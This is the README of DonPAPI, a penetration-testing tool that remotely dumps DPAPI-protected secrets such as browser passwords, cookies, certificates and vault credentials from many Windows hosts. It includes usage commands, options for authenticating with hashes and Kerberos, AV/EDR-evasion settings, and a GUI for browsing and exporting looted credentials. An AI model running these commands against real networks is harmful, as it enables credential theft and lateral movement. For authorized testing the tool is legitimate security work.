# DonPAPI

DonPAPI automates secrets dump remotely on multiple Windows computers, with defense evasion in mind.

![DonPAPI Logo](./assets/Logo%20DonPapi.png)

Collected credentials:
- Chromium browser Credentials, Cookies and Chrome Refresh Token
- Windows Certificates
- Credential Manager
- Firefox browser Credentials and Cookies
- Mobaxterm Credentials
- MRemoteNg Credentials
- RDC Manager Credentials
- Files on Desktop and and Recent folder
- SCCM Credentials
- Vaults Credentials
- VNC Credentials
- Wifi Credentials

We made a talk in french about DPAPI called **DPAPI - Don't Put Administration Passwords In 🇫🇷**:
- [Slides](./assets/Login%20Se%CC%81curite%CC%81%20-%20DPAPI%20-%20Don't%20Put%20Administration%20Passwords%20In%20-%20LeHack%202023.pdf)

## Table of Content
- [DonPAPI](#donpapi)
  - [Installation](#installation)
  - [Quick Start](#quick-start)
  - [Usage](#usage)
    - [collect](#collect)
      - [Authentication](#authentication)
      - [Collection](#collection)
      - [OPSEC](#opsec)
      - [Recover](#recover)
      - [Keep Collecting](#keep-collecting)
    - [gui](#gui)
      - [Web](#web)
      - [Functionalities](#functionalities)
  - [Disclaimer](#disclaimer)
  - [Credits](#credits)

## Installation

***This tool should be install with [pipx](https://pypi.org/project/pipx/) or in a dedicated virtual environment***

```text
pipx install donpapi
```

or (with latest commits)

```text
pipx install git+https://github.com/login-securite/DonPAPI.git
```

or (to dev)

```text
git clone git+https://github.com/login-securite/DonPAPI.git
cd DonPAPI
poetry update
poetry run DonPAPI
```

## Quick Start

```text
pipx install donpapi
donpapi collect -u admin -p 'Password123!' -d domain.local -t ALL --fetch-pvk
donpapi gui
```

## Usage

```text
usage: DonPAPI [-h] [-v] [-o DIRNAME] {collect,gui} ...

Dump revelant information on compromised targets without AV detection. Version: 2.0.0

positional arguments:
  {collect,gui}         DonPAPI Action
    collect             Dump secrets on a target list
    gui                 Spawn a Flask webserver to crawl DonPAPI database

options:
  -h, --help            show this help message and exit
  -v                    Verbosity level (-v or -vv)
  -o DIRNAME, --output-directory DIRNAME
                        Output directory. Default is ~/.donpapi/loot/
```

### collect

This action is used to collect secrets on the targets specified in `-t`.

```text
usage: dpp collect [-h] [--keep-collecting seconds] [--threads Number of threads] [--no-config] [-t TARGET [TARGET ...]] [-d domain.local]
                   [-u username] [-p password] [-H LMHASH:NTHASH] [--no-pass] [-k] [--aesKey hex key] [--laps Administrator] [--dc-ip IP address]
                   [-r /home/user/.donpapi/recover/recover_1718281433] [-c COLLECTORS] [-nr] [--fetch-pvk] [--pvkfile PVKFILE]
                   [--pwdfile PWDFILE] [--ntfile NTFILE] [--mkfile MKFILE]

options:
  -h, --help            show this help message and exit
  --keep-collecting seconds
                        Rerun the attack against all targets after X seconds, X being the value
  --threads Number of threads
                        Number of threads (default: 50)
  --no-config           Do not load donpapi config file (~/.donpapi/donpapi.conf)

authentication:
  -t TARGET [TARGET ...], --target TARGET [TARGET ...]
                        the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, ALL to fetch every
                        computer hostnames from LDAP
  -d domain.local, --domain domain.local
                        Domain
  -u username, --username username
                        Username
  -p password, --password password
                        Password
  -H LMHASH:NTHASH, --hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  --no-pass             don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid
                        credentials cannot be found, it will use the ones specified in the command line
  --aesKey hex key      AES key to use for Kerberos Authentication (1128 or 256 bits)
  --laps Administrator  use LAPS to request local admin password. The laps parameter value is the local admin account use to connect
  --dc-ip IP address    IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -r /home/user/.donpapi/recover/recover_1718281433, --recover-file /home/user/.donpapi/recover/recover_1718281433
                        The recover file path. If used, the other parameters will be ignored

attacks:
  -c COLLECTORS, --collectors COLLECTORS
                        Chromium, Certificates, CredMan, Files, Firefox, MobaXterm, MRemoteNG, RDCMan, SCCM, Vaults, VNC, Wifi, All (all
                        previous) (default: All)
  -nr, --no-remoteops   Disable Remote Ops operations (basically no Remote Registry operations, no DPAPI System Credentials)
  --fetch-pvk           Will automatically use domain backup key from database, and if not already dumped, will dump it on a domain controller
  --pvkfile PVKFILE     Pvk file with domain backup key
  --pwdfile PWDFILE     File containing username:password that will be used eventually to decrypt masterkeys
  --ntfile NTFILE       File containing username:nthash that will be used eventually to decrypt masterkeys
  --mkfile MKFILE       File containing {GUID}:SHA1 masterkeys mappings
```

#### Authentication

Authentication works by specifying a domain with `--domain`, an username with `--username`, and eventually a password with `--password`, a hash with `--hashes`, an AES key with `--aesKey` or a Kerberos ticket in ccache format with `-k` (Impacket style).
You can also authenticate through LAPS on the computer with `--laps` and the username of the local LAPS account as the value for this parameter.

#### Collection

By default, DonPAPI will collect:
- **Chromium**: Chromium browser Credentials, Cookies and Chrome Refresh Token 
- **Certificates**: Windows Certificates
- **CredMan**: Credential Manager
- **Firefox**: Firefox browser Credentials and Cookies
- **MobaXterm**: Mobaxterm Credentials
- **MRemoteNg**: MRemoteNg Credentials
- **RDCMan**: RDC Manager Credentials
- **Files**: Files on Desktop and and Recent folder
- **SCCM**: SCCM Credentials
- **Vaults**: Vaults Credentials
- **VNC**: VNC Credentials
- **Wifi**: Wifi Credentials
- **CloudCredentials**: Cloud credentials
- **IDEProjects**: IDE projects files
- **PasswordManagers**: Passwords managers files
- **PowerShellHistory**: PowerShell history files
- **RecycleBin**: Recycle Bins files
- **SSHSecrets**: SSH secrets files (keys)
- **VersionControlSystems**: Versioning tools (git for example)

You can specify each one you want to collect with `--collectors` (SharpHound style). If you use `--fetch-pvk`, DonPAPI will automatically fetch the Domain Backup Key of the AD domain and use it to decrypt masterkeys. Otherwise, you can bring one with `--pvkfile`. `--pwdfile`, `--ntfile` are used to feed DonPAPI with secrets in order to unlock masterkeys. But if you have freshly decrypted masterkeys, you can use `--mkfile`.

> [!WARNING]
> Some collection method will need to dump LSA secrets (in order to obtain the DPAPI machine key). This action can be noizy, and modern EDR will block you instantly. You can use `-nr` to avoid doing those noisy actions, but some secrets won't be collected.

#### OPSEC

DonPAPI now supports a configuration file in order to *pimp* Secretsdump behaviour. This file will be located at ~/.donpapi/donpapi.conf, and by default, it will looks like this:
```toml
[secretsdump]
share = C$
remote_filepath = \Users\Default\AppData\Local\Temp
filename_regex = \d{4}-\d{4}-\d{4}-[0-9]{4}
file_extension = .log
``` 

#### Recover

DonPAPI supports recover file. Each time you will run a `collect` command, it will save a recover file of the remaining targets and all the options. By default, the file is located in ~/.donpapi/register/ folder

#### Keep Collecting

Sometimes on an internal assessment, you want to go hard on some specific targets and collecting secrets on their computer again and again. Don't do a stupid bash loop, just use `--keep-collecting X`, X being the seconds you want to wait between each collecting sessions.

### gui

Now that you have collected all those secrets, you want to crawl them. DonPAPI allow you to go through all collected secrets with a web GUI. To launch it, use `donpapi gui`.

```text
usage: DonPAPI gui [-h] [--bind BIND] [--port PORT] [--ssl] [--basic-auth user:password]

options:
  -h, --help            show this help message and exit
  --bind BIND           HTTP Server bind address (default=127.0.0.1)
  --port PORT           HTTP Server port (default=8088)
  --ssl                 Use an encrypted connection
  --basic-auth user:password
                        Set up a basic auth
```

#### Web

**General**

This screen will show you every SAM reused passwords accross all collected computers, dumped scheduled tasks and service account passwords dumped from LSA. You can export all of them as CSV format.

**Secrets**

This screen will show you every secrets looted with DonPAPI. You can search on multiple elements and exports secrets in CSV

**Cookies**

This screen will show you every cookies looted with DonPAPI. You can search on multiple elements and exports cookies in CSV, but also copy paste them into JavaScript code to paste it in your browser.

**Certificates**

This screen will show you every certificates looted with DonPAPI. You can search on multiple elements and exports certificates in CSV, but also if a certificate allow client auth, then clicking on ***Yes*** will copy paste a [Certipy](https://github.com/ly4k/Certipy) command to use the certificate.

## Disclaimer

This tool is for educational and ethical hacking purpose only. Login Sécurité is not responsible for the abuses committed with this tool. 

#### Functionalities

The GUI frontend is developed in Vue3 + Vite.js, and the backend is Python Flask.

By default, it will be exposed at http://127.0.0.1:8088, but you can expose it the way you like, even at https://0.0.0.0:443.

> [!WARNING]
> Please never expose DonPAPI to a whole network like this, it can be very dangerous. DonPAPI supports HTTPS with `--ssl` and you can add a Basic Auth with `--basic-auth`. And moreover, please never expose DonPAPI on the Internet like this.

Clicking on a value in the tables will instantly put it in your clipboard.

A ***Hide Password*** checkbox is available in the GUI, in order to hide sensitive data in the GUI, perfect for screenshots.

## Credits

All the credits goes to these great guys for doing the hard research & coding :
- [Benjamin Delpy](https://twitter.com/gentilkiwi) for most of the DPAPI research (always greatly commented, <3 your code)
- All the team working on Impacket (https://github.com/SecureAuthCorp/impacket). Almost everything we do here comes from impacket.
- Alesandro Z & everyone who worked on Lazagne (https://github.com/AlessandroZ/LaZagne/wiki) for the VNC & Firefox modules, and most likely for a lots of other ones in the futur.
- [dirkjanm](https://twitter.com/_dirkjan) for the GUI idea in [Roadtools](https://github.com/dirkjanm/ROADtools) & every research he ever did. I learned so much on so many subjects thanks to you. <3
- [Byt3bl33d3r](https://twitter.com/byt3bl33d3r) for [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) & All the team working on [NetExec](https://github.com/Pennyw0rth/NetExec)(lots of inspiration and code comes from CME / NXC projects)
- All the Team at [Login Sécurité](https://www.login-securite.com) for their ideas and help in debugging my shitty code (special thanks to @layno & @HackAndDo for that)
